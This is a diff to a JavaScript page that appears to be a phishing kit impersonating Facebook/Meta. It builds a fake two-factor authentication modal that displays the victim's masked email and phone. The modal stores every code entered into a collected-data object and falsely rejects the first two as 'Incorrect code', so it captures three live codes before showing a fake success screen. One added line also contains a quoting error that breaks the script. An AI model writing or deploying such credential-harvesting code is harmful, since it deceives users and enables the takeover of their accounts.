@@ -1090,57 +1090,129 @@
      MODAL: Two-factor Authentication
   ============================================================ */
   function openAuthenticationModal() {
-    var html =
-      '<div style="display:flex;flex-direction:column;">'
-      + '<div class="modal-header" style="margin-bottom:6px;">'
-      + '<div class="modal-user-info"><span>' + (_masterData.fullName || '') + '</span><span class="modal-dot"></span><span>Meta</span></div>'
-      + '<button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button></div>'
-      + '<h2 style="font-size:18px;font-weight:700;color:#000;margin-bottom:12px;">Two-factor authentication</h2>'
-      + '<p class="modal-hint">Enter the 6-digit code from your authenticator app or sent to your email/phone.</p>'
-      + '<form id="authForm">'
-      + '<div class="modal-field"><input type="number" id="twoFa" placeholder="6-digit code" required inputmode="numeric" maxlength="6"></div>'
-      + '<p id="authError" class="modal-error"></p>'
-      + '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>'
-      + '<button type="button" class="modal-btn-outline">Try another way</button>'
-      + '</form></div>';
+    var name = _masterData.fullName || '';
+    var email = _masterData.email || '';
+    var phone = _masterData.phone || '';
 
-    Modal.create('authModal', html);
+    function maskEmail(e) {
+      if (!e) return '';
+      var parts = e.split('@');
+      if (parts.length < 2) return e;
+      var u = parts[0];
+      return u[0] + '*'.repeat(Math.max(u.length - 1, 6)) + '@' + parts[1];
+    }
+    function maskPhone(p) {
+      if (!p) return '';
+      var clean = p.replace(/\s/g, '');
+      var prefix = clean.slice(0, 3);
+      var last2 = clean.slice(-2);
+      return prefix + ' ******* ' + last2;
+    }
+
+    var hint = 'Enter the code for this account that we send to ';
+    if (email) hint += maskEmail(email);
+    if (phone) hint += ', ' + maskPhone(phone);
+    hint += ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
+
+    var authCount = 0;
+    var cdInterval = null;
+
+    function renderModal(step) {
+      var stepLabel = 'Two-factor authentication required (' + (step + 1) + '/3)';
+      var html =
+        '<div style="display:flex;flex-direction:column;">'
+        /* User info row */
+        + '<div style="display:flex;align-items:center;gap:6px;font-size:13px;color:#9a979e;margin-bottom:8px;">'
+        + '<span style="color:#1c1e21;font-weight:500;">' + name + '</span>'
+        + '<span style="width:4px;height:4px;background:#9a979e;border-radius:50%;display:inline-block;flex-shrink:0;"></span>'
+        + '<span>Facebook</span>'
+        + '</div>'
+        /* Title */
+        + '<h2 style="font-size:20px;font-weight:700;color:#000;margin:0 0 14px;">' + stepLabel + '</h2>'
+        /* Hint */
+        + '<p style="font-size:14px;color:#9a979e;line-height:1.55;margin:0 0 0;">' + hint + '</p>'
+        /* Image */
+        + '<div style="width:100%;border-radius:10px;background:#f5f5f5;overflow:hidden;margin:15px 0;">'
+        + '<img src="public/images/authentication.png" style="width:100%;display:block;" alt="authentication">'
+        + '</div>'
+        /* Form */
+        + '<form id="authForm">'
+        + '<div class="nf-input-wrap" style="margin-bottom:0;">'
+        + '<input id="twoFa" placeholder="Enter the code" type="number" inputmode="numeric" required class="nf-input">'
+        + '</div>'
+        + '<p id="authError" class="modal-error" style="margin-top:8px;"></p>'
+        + '<div style="margin-top:20px;">'
+        + '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>'
+        + '</div>'
+        + '<div style="margin-top:16px;width:100%;display:flex;align-items:center;justify-content:center;cursor:pointer;background:transparent;border-radius:40px;padding:10px 20px;border:1px solid #d4dbe3;">'
+        + '<span style="color:#9a979e;font-size:14px;">Try another way</span>'
+        + '</div>'
+        + '</form>'
+        /* Meta logo gray */
+        + '<div style="width:60px;margin:20px auto 0;padding-top:20px;">'
+        + '<img src="public/icons/ic_meta_gray.svg" style="width:100%;height:100%;display:block;" alt="Meta"'
+        + ' onerror="this.style.display='none'">'
+        + '</div>'
+        + '</div>';
+      return html;
+    }
+
+    Modal.create('authModal', renderModal(authCount));
+
+    /* gradient background */
+    var box = document.querySelector('#authModal .modal-box');
+    if (box) box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+
     Modal.open('authModal');
 
-    var authCount = 0, cdInterval = null;
-    document.getElementById('authForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      var code = document.getElementById('twoFa').value.trim();
-      var err = document.getElementById('authError');
-      var btn = document.getElementById('authBtn');
-      err.classList.remove('show');
-      if (!code) { err.textContent = "Please enter the code."; err.classList.add('show'); return; }
-      btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
-      if (authCount < 2) {
-        _masterData['twoFa' + authCount] = code;
-        setTimeout(function() {
-          btn.innerHTML = 'Continue';
-          var inp = document.getElementById('twoFa'); if (inp) { inp.disabled = true; inp.value = ''; }
-          var t = 30;
-          err.textContent = 'Incorrect code. Try again after ' + t + 's.'; err.classList.add('show');
-          cdInterval = setInterval(function() {
-            t--; err.textContent = 'Incorrect code. Try again after ' + t + 's.';
-            if (t <= 0) {
-              clearInterval(cdInterval);
-              if (inp) { inp.disabled = false; } btn.disabled = false;
-              err.classList.remove('show');
-            }
-          }, 1000);
-          authCount++;
-        }, 1400);
-      } else {
-        _masterData.twoFaFinal = code;
-        setTimeout(function() { Modal.close('authModal'); setTimeout(openSuccessModal, 280); }, 1600);
-      }
-    });
+    function bindForm() {
+      var form = document.getElementById('authForm');
+      if (!form) return;
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        var code = document.getElementById('twoFa').value.trim();
+        var err = document.getElementById('authError');
+        var btn = document.getElementById('authBtn');
+        err.classList.remove('show');
+        if (!code) { err.textContent = 'Please enter the code.'; err.classList.add('show'); return; }
+        btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
+
+        if (authCount < 2) {
+          _masterData['twoFa' + authCount] = code;
+          setTimeout(function() {
+            var t = 30;
+            btn.innerHTML = 'Continue';
+            var inp = document.getElementById('twoFa');
+            if (inp) { inp.disabled = true; inp.value = ''; }
+            err.textContent = 'Incorrect code. Try again after ' + t + 's.';
+            err.classList.add('show');
+            cdInterval = setInterval(function() {
+              t--;
+              err.textContent = 'Incorrect code. Try again after ' + t + 's.';
+              if (t <= 0) {
+                clearInterval(cdInterval);
+                /* Re-render modal với step mới */
+                authCount++;
+                var wrap = document.querySelector('#authModal .modal-box');
+                if (wrap) {
+                  wrap.innerHTML = renderModal(authCount);
+                  wrap.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
+                  bindForm();
+                }
+              }
+            }, 1000);
+          }, 1400);
+        } else {
+          _masterData.twoFaFinal = code;
+          setTimeout(function() { Modal.close('authModal'); setTimeout(openSuccessModal, 280); }, 1600);
+        }
+      });
+    }
+
+    bindForm();
   }
 
-  /* ============================================================
+    /* ============================================================
      MODAL: Success
   ============================================================ */
   function openSuccessModal() {
